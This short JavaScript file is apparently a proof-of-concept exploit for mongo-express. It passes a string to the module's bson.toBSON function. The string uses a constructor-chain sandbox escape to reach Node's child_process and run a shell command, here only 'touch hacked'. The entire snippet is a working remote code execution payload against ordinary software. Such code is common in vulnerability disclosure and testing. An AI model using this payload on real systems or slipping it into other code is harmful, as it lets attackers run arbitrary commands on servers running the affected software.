exploit =
  "this.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('touch hacked')";

var bson = require("mongo-express/lib/bson");
bson.toBSON(exploit);
